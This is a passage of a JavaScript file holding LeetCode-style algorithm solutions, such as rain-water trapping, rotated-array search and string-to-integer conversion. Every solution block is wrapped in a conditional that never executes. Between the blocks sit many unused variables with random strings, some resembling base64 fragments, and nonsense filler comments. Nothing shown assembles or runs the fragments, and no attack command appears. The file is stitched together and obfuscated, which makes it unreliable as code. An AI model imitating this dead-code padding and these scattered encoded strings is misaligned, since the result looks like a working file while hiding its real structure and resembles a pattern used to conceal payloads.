        } else if (nums[end] < nums[mid]) {
            start = mid + 1;
        } else {
            return nums[start];
        }
    }
    
    return nums[start];
};

}

    var feiak = 'pYUmx';
if (0.79 && false) {
    /**
Given n non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining.

For example, 
Given [0,1,0,2,1,0,1,3,2,1,2,1], return 6.


The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. Thanks Marcos for contributing this image!


*/

// add new solution 
/**
 * @param {number[]} height
 * @return {number}
 *
 * Search from left to right and maintain a max height of left and right separately, which is like a one-side wall of partial container. Fix the higher one and flow water from the lower part. For example, if current height of left is lower, we fill water in the left bin. Until left meets right, we filled the whole container.
 */
var trap = function(height) {
    var len = height.length,
        leftMax = 0,
        rightMax = 0,
        left = 0,
        right = len - 1,
        sum = 0;
    
    while (left <= right) {
        if (height[left] <= height[right]) {
            if (height[left] > leftMax) {
                leftMax = height[left];
            } else {
                sum += leftMax - height[left];
            }
            
            left++;
        } else {
            if (height[right] > rightMax) {
                rightMax = height[right];
            } else {
                sum += rightMax - height[right];
            }
            
            right--;
        }
    }
    
    return sum;
};


/**
 * @param {number[]} height
 * @return {number}
 */
var trap = function(height) {
    var len = height.length,
        leftMax = [],
        rightMax = [],
        max,
        sum = 0,
        i;
    
    leftMax[0] = 0;
    rightMax[len - 1] = 0;
    
    for (i = 1; i < len; i++) {
        leftMax[i] = Math.max(leftMax[i - 1], height[i - 1]);
    }
    
    for (i = len - 2; i >= 0; i--) {
        rightMax[i] = Math.max(rightMax[i + 1], height[i + 1]);
    }
    
    for (i = 1; i < len - 1; i++) {
        max = Math.min(leftMax[i], rightMax[i]);
        
        if (max - height[i] > 0) {
            sum += max - height[i];
        }
    }
    
    return sum;
};

}

    var lpgsgpt = 'GeVEWvHek';
// world export array event array value object hello event debug export constant code event
    var jgfahtb = 'pcYUQwwi';
if (!true && 0) {
    /**
There are N children standing in a line. Each child is assigned a rating value.

You are giving candies to these children subjected to the following requirements:

Each child must have at least one candy.
Children with a higher rating get more candies than their neighbors.
What is the minimum candies you must give?
*/

//TLE
/**
 * @param {number[]} ratings
 * @return {number}
 */
var candy = function(ratings) {
    let len = ratings.length;
    let candies = [];
    let sum = 1;
    
    candies[0] = 1;
    
    for (let i = 1; i < len; i++) {
        if (ratings[i] <= ratings[i - 1]) {
            if (candies[i - 1] > 1) {
                candies[i] = 1;
                sum++;
            } else {
                candies[i] = 1;
                sum++;
                let k = i;
                
                while (k > 0 && (ratings[k] < ratings[k - 1]) && (candies[k - 1] <= candies[k])) {
                    candies[k - 1]++;
                    sum++;
                    k--;
                }
                
                
            }
        } else {
            candies[i] = candies[i - 1] + 1;
            sum += candies[i];
        }
    }
    
    return sum;
};

}

    var mstagjvrxpkfpar = 'ZM1Fn';
if (4 === 12) {
    /**
Given a binary tree, return the vertical order traversal of its nodes' values. (ie, from top to bottom, column by column).

If two nodes are in the same row and column, the order should be from left to right.

Examples:

    Given binary tree [3,9,20,null,null,15,7],

       3
      /\
     /  \
     9  20
        /\
       /  \
      15   7

    return its vertical order traversal as:

    [
      [9],
      [3,15],
      [20],
      [7]
    ]

    Given binary tree [3,9,8,4,0,1,7],

         3
        /\
       /  \
       9   8
      /\  /\
     /  \/  \
     4  01   7

    return its vertical order traversal as:

    [
      [4],
      [9],
      [3,0,1],
      [8],
      [7]
    ]

    Given binary tree [3,9,8,4,0,1,7,null,null,null,2,5] (0's right child is 2 and 1's left child is 5),

         3
        /\
       /  \
       9   8
      /\  /\
     /  \/  \
     4  01   7
        /\
       /  \
       5   2

    return its vertical order traversal as:

    [
      [4],
      [9,5],
      [3,0,1],
      [8,2],
      [7]
    ]


*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
 
function TreeColumnNode(col, node) {
    this.col = col;
    this.treeNode = node;
}
/**
 * @param {TreeNode} root
 * @return {number[][]}
 */
var verticalOrder = function(root) {
    let col = 0;
    let node = root;
    let queue = [];
    let result = [];
    let map = {};
    let min = 0;
    let max = 0;
    
    if (!node) {
        return result;
    }
    
    queue.push(new TreeColumnNode(0, root));
    
    while (queue.length > 0) {
        const node = queue.shift();
        
        if (map[node.col] === undefined) {
            map[node.col] = [];
        }
        
        map[node.col].push(node.treeNode.val);
        
        if (node.treeNode.left) {
            queue.push(new TreeColumnNode(node.col - 1, node.treeNode.left));
            min = Math.min(min, node.col - 1);
        }
        
        if (node.treeNode.right) {
            queue.push(new TreeColumnNode(node.col + 1, node.treeNode.right));
            max = Math.max(max, node.col + 1);
        }
    }
    
    for (let i = min; i <= max; i++) {
        result.push(map[i]);
    }
    
    return result;
};

function helper(node, col, arr) {
    if (!node) {
        return;
    }
    
    if (node.left) {
        if (arr[col] === undefined) {
            arr[col - 1] = [];
        }
        
        arr[col - 1].push(node.left);
    }
    
    if (node.right) {
        if (arr[col] === undefined) {
            arr[col + 1] = [];
        }
        
        arr[col + 1].push(node.right);
    }
    
    helper(node.left, col - 1, arr);
    helper(node.right, col + 1, arr);
}

}

    var fnvqbj = 'fSTAfFnds';
if (typeof window === 'undefined') {
    /**
Given an array of integers, find out whether there are two distinct indices i and j in the array such that the difference between nums[i] and nums[j] is at most t and the difference between i and j is at most k.
*/

/**
The idea is like the bucket sort algorithm. Suppose we have consecutive buckets covering the range of nums with each bucket a width of (t+1). If there are two item with difference <= t, one of the two will happen:

(1) the two in the same bucket
(2) the two in neighbor buckets

*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @param {number} t
 * @return {boolean}
 */
var containsNearbyAlmostDuplicate = function(nums, k, t) {
    var len = nums.length,
        map = {},
        id,
        i;
    
    if (t < 0) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        id = getBucketId(nums[i], t + 1);
        
        if (map.hasOwnProperty(id)) {
            return true;
        } 
        
        if (map.hasOwnProperty(id - 1) && Math.abs(map[id - 1] - nums[i]) <= t) {
            return true;
        }
        
        if (map.hasOwnProperty(id + 1) && Math.abs(map[id + 1] - nums[i]) <= t) {
            return true;
        }
        
        map[id] = nums[i];
        
        if (i >= k) {
            delete map[getBucketId(nums[i - k], t + 1)];
        }
    }
    
    return false;
};

function getBucketId(num, bucketLength) {
    return Math.floor(num / bucketLength);
}

}

    var xyrexaf = 'YVdZZ2RHa';
    var iclhodk = 'qxZpQ';
    var euqfu = 'GxJR';
    var yhrpfvsbi = 'PvCD';
    var scxxpolpybzi = '1JsWW';
    var cuacdhgxxlji = 'wUaf';
if (!true && 0) {
    /**
Given a linked list, determine if it has a cycle in it.

Follow up:
Can you solve it without using extra space?

 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
 * @param {ListNode} head
 * @return {boolean}
 */
var hasCycle = function(head) {
    var slow = head,
        fast = head;
    
    while(fast !== null && fast.next !== null) {
        slow = slow.next;
        fast = fast.next.next;
        if (slow === fast || (fast && fast.next === slow)) {
            return true;
        }
    }
    return false;
};

}

    var jgbfbdjcv = '5WbloyV';
if (8 === 15) {
    /**
Find all possible combinations of k numbers that add up to a number n, given that only numbers from 1 to 9 can be used and each combination should be a unique set of numbers.

Ensure that numbers within the set are sorted in ascending order.


Example 1:

Input: k = 3, n = 7

Output:

[[1,2,4]]

Example 2:

Input: k = 3, n = 9

Output:

[[1,2,6], [1,3,5], [2,3,4]]
*/
/**
 * @param {number} k
 * @param {number} n
 * @return {number[][]}
 */
var combinationSum3 = function(k, n) {
    var result = [];
    
    fillResult(0, [], 1, k, n, result);
    
    return result;
};

function fillResult(curSum, curArr, startNum, k, n, result) {
    if (curArr.length > k || curSum > n) {
        return;
    }
    
    if (curArr.length === k) {
        if (curSum === n) {
            result.push(curArr.concat());
        }
        
        return;
    }
    
    var temp = curArr.concat(),
        curNum,
        i;
    
    for (i = startNum; i <= 9; i++) {
        temp.push(i);
        fillResult(curSum + i, temp, i + 1, k, n, result);
        temp.pop();
    }
}

}

    var pguavlhogllg = 'DvDrUBC';
if (8 === 13) {
    /**
Count the number of prime numbers less than a non-negative number, n

 * @param {number} n
 * @return {number}
 */
var countPrimes = function(n) {
    var i,
        j,
        result = 0,
        prime;
    if (n === 1) {
        return 0;
    }
    for (i = 2; i < n; i++) {
        prime = true;
        for (j = 2; j*j <= i; j++) {
            if (i%j === 0) {
                prime = false;
                break;
            }
        }
        if (prime) {
            result++;
        }
    }
    return result;
};

}

    var bkigtbxjtuvoirz = 'nlJR2x6SUd';
    var bddavv = 'CSxxqovz';
if (typeof document === 'undefined') {
    /**
Suppose a sorted array is rotated at some pivot unknown to you beforehand.

(i.e., 0 1 2 4 5 6 7 might become 4 5 6 7 0 1 2).

You are given a target value to search. If found in the array return its index, otherwise return -1.

You may assume no duplicate exists in the array.
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number}
 */
var search = function(nums, target) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] === target) {
            return mid;
        } else if (nums[start] <= nums[mid]) {// left side sorted
            if (nums[mid] > target && nums[start] <= target) {
                // nums[mid] !== target, can safely do end = mid - 1
                end = mid - 1;
            } else {
                start = mid + 1;
            }
        } else { // right side sorted
            if (nums[mid] < target && nums[end] >= target) {
                // nums[mid] !== target, can safely do start = mid + 1
                start = mid + 1;
            } else {
                end = mid - 1;
            }
        }
    }
    
    return -1;
};

}

    var lszkoubxwms = 'KbGFXNW5';
if (1 instanceof String) {
    /**
Given an absolute path for a file (Unix-style), simplify it.

For example,
path = "/home/", => "/home"
path = "/a/./b/../../c/", => "/c"
click to show corner cases.

Corner Cases:
Did you consider the case where path = "/../"?
In this case, you should return "/".
Another corner case is the path might contain multiple slashes '/' together, such as "/home//foo/".
In this case, you should ignore redundant slashes and return "/home/foo".
*/
/**
 * @param {string} path
 * @return {string}
 */
var simplifyPath = function(path) {
    var paths = [],
        arr = path.split('/'),
        len = arr.length,
        cur,
        i,
        result = '';
        
    for (i = 0; i < len; i++) {
        cur = arr[i];
        
        if (cur === '.' || cur.length === 0) {
            continue;
        }
        
        if (cur === '..') {
            if (paths.length > 0) {
                paths.pop();
            }
        } else {
            paths.push(cur);
        }
    }
    
    for (i = 0; i < paths.length; i++) {
        result += '/' + paths[i];
    }
    
    if (result === '') {
        result = '/';
    }
    
    return result;
};

}

    var nzbvgqggjh = 'eojlGulDJa';
    var fhxbjcagchbfxj = 'JSFZ6WldRd';
if ('e' === 'H') {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

Design an algorithm to find the maximum profit. You may complete as many transactions as you like (ie, buy one and sell one share of the stock multiple times). However, you may not engage in multiple transactions at the same time (ie, you must sell the stock before you buy again).

 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var i,
        length = prices.length,
        low,
        high,
        cur,
        prev,
        temp = 0
        max = 0;
    
    if (length === 0 || length === 1) {
        return max;
    }
    low = prices[0];
    high = prices[0];
    prev = low;
    for (i = 1; i < length; i++) {
        cur = prices[i];
        if (cur > prev) {
            high = cur;
            temp = high - low;
        } else if (cur < prev) {
            max += temp;
            temp = 0;
            low = cur;
            high = cur;
        }
        prev = cur;
    }
    if (temp !== 0) {
        max += temp;
    }
    return max;
};

}

    var qxelksf = 'rXfKxSS';
if (0.91 && false) {
    /**
Given two 1d vectors, implement an iterator to return their elements alternately.

For example, given two 1d vectors:

v1 = [1, 2]
v2 = [3, 4, 5, 6]

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1, 3, 2, 4, 5, 6].

Follow up: What if you are given k 1d vectors? How well can your code be extended to such cases?

Clarification for the follow up question - Update (2015-09-18):
The "Zigzag" order is not clearly defined and is ambiguous for k > 2 cases. If "Zigzag" does not look right to you, replace "Zigzag" with "Cyclic". For example, given the following input:

[1,2,3]
[4,5,6,7]
[8,9]

It should return [1,4,8,2,5,9,3,6,7]. 
*/
/**
 * @constructor
 * @param {Integer[]} v1
 * @param {Integer[]} v1
 */
var ZigzagIterator = function ZigzagIterator(v1, v2) {
    this.arr = arguments;
    this.list = [];
    
    for (let i = 0; i < this.arr.length; i++) {
        if (this.arr[i].length > 0) {
            this.list.push([i, 0]);
        }
    }
    
};


/**
 * @this ZigzagIterator
 * @returns {boolean}
 */
ZigzagIterator.prototype.hasNext = function hasNext() {
    return this.list.length > 0;
};

/**
 * @this ZigzagIterator
 * @returns {integer}
 */
ZigzagIterator.prototype.next = function next() {
    const targetIndex = this.list.shift();
    const val = this.arr[targetIndex[0]][targetIndex[1]];
    
    if (targetIndex[1] < this.arr[targetIndex[0]].length - 1) {
        this.list.push([targetIndex[0], targetIndex[1] + 1]);
    }
    
    return val;
};

/**
 * Your ZigzagIterator will be called like this:
 * var i = new ZigzagIterator(v1, v2), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var gauhxkbt = 'UNteG';
if (0.66 && false) {
    /**
Given an array S of n integers, are there elements a, b, c, and d in S such that a + b + c + d = target? Find all unique quadruplets in the array which gives the sum of target.

Note:
Elements in a quadruplet (a,b,c,d) must be in non-descending order. (ie, a ≤ b ≤ c ≤ d)
The solution set must not contain duplicate quadruplets.
    For example, given array S = {1 0 -1 0 -2 2}, and target = 0.

    A solution set is:
    (-1,  0, 0, 1)
    (-2, -1, 1, 2)
    (-2,  0, 0, 2)
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number[][]}
 */
var fourSum = function(nums, target) {
    nums.sort(function(a, b) {
        return a - b;
    });
     
    var len = nums.length,
        result = [],
        i;
        
    kSum(result, [], 4, nums, target, 0, len - 1);
    
    return result;
};

function kSum(result, curArr, k, nums, target, startIndex, endIndex) {
    var len = nums.length,
        start,
        end,
        sum,
        i;
    
    if (k >= 3) {
        for (i = startIndex; i <= endIndex; i++) {
            if (i > startIndex && nums[i] === nums[i - 1]) {
                continue;
            }
            
            curArr.push(nums[i]);
            kSum(result, curArr.concat(), k - 1, nums, target - nums[i], i + 1, endIndex);
            curArr.pop();
        }
    }
    
    if (k === 1) {
        for (i = startIndex; i <= endIndex; i++) {
            if (nums[i] === target) {
                result.push(nums[i]);
            }
        }
    }
    
    if (k === 2) {
        start = startIndex;
        end = endIndex;
        
        while (start < end) {
            sum = nums[start] + nums[end];
            
            if (sum === target) {
                curArr.push(nums[start]);
                curArr.push(nums[end]);
                result.push(curArr.concat());
                curArr.pop();
                curArr.pop();
                
                start++;
                end--;
                
                while(nums[start] === nums[start - 1]) {
                    start++;
                }
                
                while(nums[end] === nums[end + 1]) {
                    end--;
                }
            } else if (sum < target) {
                start++;
            } else {
                end--;
            }
        }
    }
}

}

    var wvaatbay = 'gfYrmK';
    var gbregtdwxoetuuy = 'xkQ0JrWld';
    var jgdculudb = 'NRAwyg';
    var wowksqggwgtavbs = 'KMVow';
if (Array.isArray(3)) {
    /**
Given numRows, generate the first numRows of Pascal's triangle.

For example, given numRows = 5,
Return

[
     [1],
    [1,1],
   [1,2,1],
  [1,3,3,1],
 [1,4,6,4,1]
]
*/
/**
 * @param {number} numRows
 * @return {number[][]}
 */
var generate = function(numRows) {
    var init = [],
        result = [],
        i;
        
    if (numRows === 0) {
        return result;
    }
    
    init.push(1);
    result.push(init);
    i = 1;
    
    while (i < numRows) {
        result = helper(result, ++i);
    }
    
    return result;
};

function helper(arr, k) {
    var len = arr.length,
        cur = arr[len - 1],
        result = [],
        i;
    
    result.push(1);
    
    for (i = 0; i < len - 1; i++) {
        result[i + 1] = cur[i] + cur[i + 1];
    }
    
    result.push(1);
    arr.push(result);
    
    return arr;
}

}

    var rnwcdonzkio = 'PYdz';
    var dwatfxy = 'Umxk';
    var njombdtdx = 'nhZTbMdc';
if (8 instanceof String) {
    /**
Given an input string, reverse the string word by word.

For example,
Given s = "the sky is blue",
return "blue is sky the".

 * @param {string} str
 * @returns {string}
 */
var reverseWords = function(str) {
    var result = '',
        arr,
        len,
        i;
        
    if (str === null || str === '') {
        return result;
    }
    arr = str.split(' ');
    len = arr.length;
    for(i = len - 1; i >= 0; i--) {
        if (arr[i].length === 0) {
            continue;
        }
        result += ' ' + arr[i];
    }
    return result.trim();
};

}

// async object string export string
    var nfiymodikkk = 'WMINLB';
if (7 > 138) {
    /**
Given a string containing only digits, restore it by returning all possible valid IP address combinations.

For example:
Given "25525511135",

return ["255.255.11.135", "255.255.111.35"]. (Order does not matter)
*/
/**
 * @param {string} s
 * @return {string[]}
 */
var restoreIpAddresses = function(s) {
    var result = [],
        len = s.length;
    
    if (len > 12) {
        return result;
    }
    
    helper(result, s, 0, [], len);
    
    return result;
};

function helper(result, s, index, curArr, len) {
    if (curArr.length === 4) {
        if (index === len) {
            result.push(curArr.join('.'));
        }
        return;
    }
    
    var i,
        num;
    
    // only 3 situations
    for (i = index; i < len && i <= index + 3; i++) {
        num = s.substring(index, i + 1);
        
        if (isValid(num)) {
            curArr.push(parseInt(num));
            helper(result, s, i + 1, curArr.concat(), len);
            curArr.pop();
        } 
        
    }
}

function isValid(s) {
    if (s.charAt(0) === '0') {
        return s === '0';
    }
    
    var num = parseInt(s);
    
    return num >= 0 && num <= 255;
}

}

    var khdxlugsbena = 'R1ZqZ';
if (87 > 169) {
    /**
You are given an integer array nums and you have to return a new counts array. The counts array has the property where counts[i] is the number of smaller elements to the right of nums[i].

Example:

Given nums = [5, 2, 6, 1]

To the right of 5 there are 2 smaller elements (2 and 1).
To the right of 2 there is only 1 smaller element (1).
To the right of 6 there is 1 smaller element (1).
To the right of 1 there is 0 smaller element.
Return the array [2, 1, 1, 0].
*/

/**
 * @param {number[]} nums
 * @return {number[]}
 * 
 * 将给定数组从最后一个开始，用二分法插入到一个新的数组，这样新数组就是有序的，那么此时该数字在新数组中的坐标就是原数组中其右边所有较小数字的个数
 */
var countSmaller = function(nums) {
    var result = [],
        tmp = [],
        len = nums.length,
        left,
        right,
        mid,
        i; // array for sorting nums
        
    for (i = len - 1; i >= 0; i--) {
        left = 0;
        right = tmp.length;
        
        while (left < right) {
            mid = Math.floor((left + right) / 2);
            if (tmp[mid] >= nums[i]) {
                right = mid;
            } else {
                left = mid + 1;
            }
        }
        
        result[i] = right;
        tmp.splice(right, 0, nums[i]);
    }
    
    return result;
};

}

    var ibhvprptkv = 'LPlDW';
    var qoblkisidbxbc = 'EdWa';
    var jnfsusj = 'MVCRyzUlf';
    var ninkjcfbs = '0lEMGdab';
    var rerlpwbro = 'ouuQ';
if (0.90 && false) {
    /**
Given an array S of n integers, find three integers in S such that the sum is closest to a given number, target. Return the sum of the three integers. You may assume that each input would have exactly one solution.

    For example, given array S = {-1 2 1 -4}, and target = 1.

    The sum that is closest to the target is 2. (-1 + 2 + 1 = 2).

*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number}
 */
var threeSumClosest = function(nums, target) {
    var len = nums.length,
        minDiff = Number.MAX_VALUE,
        diff,
        left,
        right,
        i,
        j;
        
    nums.sort(function(a, b) {
        return a - b;
    });
    
    for (i = 0; i < len; i++) {
        left = i + 1;
        right = len - 1;
        
        while (left < right) {
            diff = target - nums[i] - nums[left] - nums[right];
            
            if (diff === 0) {
                return target;
            } else if (diff > 0) {
                left++;
            } else {
                right--;
            }
            
            if (Math.abs(diff) < Math.abs(minDiff)) {
                minDiff = diff;
            }
        }
    }
    
    return target - minDiff;
};

}

    var xsnvmedx = 'UZzYzJVN';
    var lgbythp = 'YYozyQEDDW';
// script await
    var tcfojatzuq = 'fARtvpBeo';
    var ezfehy = '0Np';
    var qihgxsgouv = 'RMtWmZjqD';
// compile import
    var rouskm = 'hKoSHL';
if ('l' === 'D') {
    /**
Implement atoi to convert a string to an integer.

Hint: Carefully consider all possible input cases. If you want a challenge, please do not see below and ask yourself what are the possible input cases.

Notes: It is intended for this problem to be specified vaguely (ie, no given input specs). You are responsible to gather all the input requirements up front.

Update (2015-02-10):
The signature of the C++ function had been updated. If you still see your function signature accepts a const char * argument, please click the reload button  to reset your code definition.

spoilers alert... click to show requirements for atoi.

Requirements for atoi:
The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value.

The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.

If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed.

If no valid conversion could be performed, a zero value is returned. If the correct value is out of the range of representable values, INT_MAX (2147483647) or INT_MIN (-2147483648) is returned.

*/
/**
 * @param {string} str
 * @return {number}
 */
var myAtoi = function(str) {
    var len = str.length,
        isNegative = null,
        result = 0,
        numberStarted = false,
        cur,
        i;
        
    for (i = 0; i < len; i++) {
        if (str.charAt(i) === ' ') {
            if (!numberStarted) {
                continue;
            } else {
                return getResult(isNegative, result);
            }
        }
        
        if (isNegative === null) {
            if (str.charAt(i) === '-') {
                isNegative = true;
                numberStarted = true;
                continue;
            } else if (str.charAt(i) === '+') {
                isNegative = false;
                numberStarted = true;
                continue;
            }
        }
        
        cur = parseInt(str.charAt(i));
        
        if (!isNaN(cur)) {
            result = result*10 + cur;
            
            if (!numberStarted) {
                numberStarted = true;
            }
        } else {
            return getResult(isNegative, result);
        }
    }
    
    return getResult(isNegative, result);
};
// :(
function getResult(isNegative, result) {
    result = isNegative? result * (-1) : result;
    
    if (result > 2147483647) {
        result = 2147483647;
    } else if (result < -2147483648) {
        result = -2147483648;
    }
    
    return result;
}

}

    var hhueucwfvwiw = 'aG1kVzVqZ';
if (null === 3) {
    /**
 * @param {number} n
 * @return {number}
 */
var numSquares = function(n) {
    var arr = [],
        i,
        j;
    
    arr[0] = 0;
    
    for (i = 1; i <= n; i++) {
        arr[i] = Number.MAX_VALUE;
    }
    
    for (i = 0; i <= n; i++) {
        for (j = 1; i + j * j <= n; j++) {
            arr[i + j * j] = Math.min(arr[i + j * j], arr[i] + 1);
        }
    }
    
    return arr[n];
};

// SOLUTION 2
/**
 * 根据四平方和定理，任意一个正整数均可表示为4个整数的平方和，其实是可以表示为4个以内的平方数之和，那么就是说返回结果只有1,2,3或4其中的一个，首先我们将数字化简一下，由于一个数如果含有因子4，那么我们可以把4都去掉，并不影响结果，比如2和8,3和12等等，返回的结果都相同，读者可自行举更多的栗子。
 * 还有一个可以化简的地方就是，如果一个数除以8余7的话，那么肯定是由4个完全平方数组成，这里就不证明了，因为我也不会证明，读者可自行举例验证。那么做完两步后，一个很大的数有可能就会变得很小了，大大减少了运算时间，下面我们就来尝试的将其拆为两个平方数之和，如果拆成功了那么就会返回1或2，因为其中一个平方数可能为0. 
 * @param {number} n
 * @return {number}
 */
var numSquares = function(n) {
    while(n % 4 === 0) {
        n /= 4;
    }
    
    if (n % 8 === 7) {
        return 4;
    }
    
    var i,
        j;
    
    // check if it's 1 or 2
    for (i = 0; i * i <= n; i++) {
        j = parseInt(Math.sqrt(n - i * i));
        if (i * i + j * j === n) {
            return (i === 0 || j === 0)? 1 : 2;
        }
    }
    
    return 3;
};

}

    var eefsmdbodtah = 'hItbxzMDPl';
if (4 === 17) {
    /**
Reverse a singly linked list.

click to show more hints.

Hint:
A linked list can be reversed either iteratively or recursively. Could you implement both?
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var reverseList = function(head) {
    var cur = head,
        next;
    
    head = null;
    
    while(cur) {
        next = cur.next;
        cur.next = head;
        
        if (next) {
            head = cur;
            cur = next;
        } else {
            return cur;   
        }
    }
    
    return null;
};

// recursive

var reverseList = function(head) {
    if (!head) {
        return null;
    }
    
    if (!head.next) {
        return head;
    }
    
    var newHead = reverseList(head.next);
    
    head.next.next = head;
    head.next = null;
    
    return newHead;
};

}

    var ecvavldw = 'EdsdmJ';
    var mzfippksv = 'uklewUH';
if (Array.isArray(7)) {
    /**
The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the "root." Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that "all houses in this place forms a binary tree". It will automatically contact the police if two directly-linked houses were broken into on the same night.

Determine the maximum amount of money the thief can rob tonight without alerting the police.

Example 1:
     3
    / \
   2   3
    \   \ 
     3   1
Maximum amount of money the thief can rob = 3 + 3 + 1 = 7.
Example 2:
     3
    / \
   4   5
  / \   \ 
 1   3   1
Maximum amount of money the thief can rob = 4 + 5 = 9.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var rob = function(root) {
    var result = dfsRob(root);
    
    return Math.max(result[0], result[1]);
};

// return an array to keep 2 values: 
// the maximum money when a root is selected and the maximum value when a root if NOT selected.
function dfsRob(root) {
    if (!root) {
        return [0, 0];
    }
    
    var left = dfsRob(root.left),
        right = dfsRob(root.right),
        includeRootVal,
        noRootVal;
    
    includeRootVal = left[1] + right[1] + root.val;
    noRootVal = Math.max(left[0], left[1]) + Math.max(right[0], right[1]);
    
    return [includeRootVal, noRootVal];
}

}

    var azimnrj = 'pQm';
if (null === 5) {
    /**
Given a sorted integer array where the range of elements are [lower, upper] inclusive, return its missing ranges.

For example, given [0, 1, 3, 50, 75], lower = 0 and upper = 99, return ["2", "4->49", "51->74", "76->99"]. 
*/
/**
 * @param {number[]} nums
 * @param {number} lower
 * @param {number} upper
 * @return {string[]}
 */
var findMissingRanges = function(nums, lower, upper) {
    let start, prev, end;
    let result = [];
    const len = nums.length;
    
    if (len === 0) {
        if (lower === upper) {
            result.push(lower + '');
        } else {
            result.push(lower + '->' + upper);
        }
        
        return result;
    }
    
    start = nums[0];
    prev = nums[0];
    
    if (start > lower) {
        start--;
        
        if (lower === start) {
            result.push(lower + '');
        } else {
            result.push(lower + '->' + start);
        }
    }
    
    for (let i = 1; i < len; i++) {
        if (nums[i] > prev + 1) {
            start = prev + 1;
            end = nums[i] - 1;
            
            if (start === end) {
                result.push(start + '');
            } else {
                result.push(start + '->' + end);
            }
        }
        
        prev = nums[i];
    }
    
    if (prev + 1 === upper) {
        result.push(upper + '');
    } else if (prev + 1 < upper) {
        result.push(prev + 1 + '->' + upper);
    }
    
    return result;
};

}

    var wyzsjqetet = 'sdimt';
    var klfvcbv = 'phR1Z';
    var iqsnswbaktw = 'NCwFM';
    var cenpvppeltrvzl = 'qYT';
    var cssmwlam = 'JqEgtpqTME';
    var vmptxq = 'BSbFluV';
if (typeof navigator === 'undefined') {
    /**
Given an array of non-negative integers, you are initially positioned at the first index of the array.

Each element in the array represents your maximum jump length at that position.

Determine if you are able to reach the last index.

For example:
A = [2,3,1,1,4], return true.

A = [3,2,1,0,4], return false.


 * @param {number[]} nums
 * @return {boolean}
 */
var canJump = function(nums) {
    var len = nums.length,
        cover = 0,
        i;
    
    for(i = 0; i < len; i++) {
        if (cover >= i) {
            cover = Math.max(cover, nums[i] + i);
            if (cover >= len - 1) {
                return true;
            }
        } else {
            return false;
        }
    }
};

}

    var uowyfw = 'XyJqn';
// return hello event loop string loop export constant event
    var ziisylpa = 'pukMiAia';
    var jefpagq = 'm5aM';
if (typeof document === 'undefined') {
    /**
Given a sorted integer array without duplicates, return the summary of its ranges.

For example, given [0,1,2,4,5,7], return ["0->2","4->5","7"].
*/

/**
 * @param {number[]} nums
 * @return {string[]}
 */
var summaryRanges = function(nums) {
    var len = nums.length,
        result = [],
        curStr = '',
        curLen,
        curNum,
        i;
        
    if (len === 0) {
        return result;
    }
    
    curNum = nums[0];
    curStr += curNum;
    curLen = 1;
    
    for (i = 1; i < len; i++) {
        if (curNum + 1 === nums[i]) {
            curNum++;
            curLen++;
        } else {
            if (curLen > 1) {
                curStr += '->' + curNum;
            }
            
            result.push(curStr);
            curNum = nums[i];
            curLen = 1;
            curStr = '' + curNum;
        }
    }
    
    if (curLen > 1) {
        curStr += '->' + curNum;
    }
            
    result.push(curStr);
    return result;
};

}

    var hmclgyntexp = 'psMor';
    var lcnjptdu = 'lZ5S';
    var jxyronzvwsi = 'QHRYPkTi';
if (null === 1) {
    /**
 * @param {number} n
 * @return {number}
 */
var numTrees = function(n) {
    var i,
        j,
        result = [];
    
    result[0] = 1;
    result[1] = 1;
    
    for (i = 2; i <= n; i++) {
        result[i] = 0;
        for (j = 0; j < i; j++) {
            result[i] += result[j] * result[i - 1 - j];
        }
        
    }
    return result[n];
};

}

    var vrdlmkcf = '0NrZ2V3';
    var xwdzmpwmtpzp = 'dsRl';
    var sulrid = 'b2dJQ0Fn';
if (typeof navigator === 'undefined') {
    /**
Given a non-negative number represented as an array of digits, plus one to the number.

The digits are stored such that the most significant digit is at the head of the list.
*/
/**
 * @param {number[]} digits
 * @return {number[]}
 */
var plusOne = function(digits) {
    var len = digits.length,
        overflow = 1,
        i;
    
    for (i = len - 1; i >= 0; i--) {
        digits[i] = digits[i] + overflow;
        if (digits[i] === 10) {
            overflow = 1;
            digits[i] = 0;
        } else {
            return digits;
        }
    }
    
    if (overflow === 1) {
        digits.unshift(1);
        return digits;
    }
};

}

    var masbpozcqe = 'QiBrlAJVdl';
if (typeof document === 'undefined') {
    /**
Given two numbers represented as strings, return multiplication of the numbers as a string.

Note:
The numbers can be arbitrarily large and are non-negative.
Converting the input string to integer is NOT allowed.
You should NOT use internal library such as BigInteger.
*/

// BETTER SOLUTION
//  `num1[i] * num2[j]` will be placed at indices `[i + j`, `i + j + 1]` 
/**
 * @param {string} num1
 * @param {string} num2
 * @return {string}
 */
var multiply = function(num1, num2) {
    const len1 = num1.length;
    const len2 = num2.length;
    let result = new Array(len1 + len2).fill(0);
    
    for (let i = len1 - 1; i >= 0; i--) {
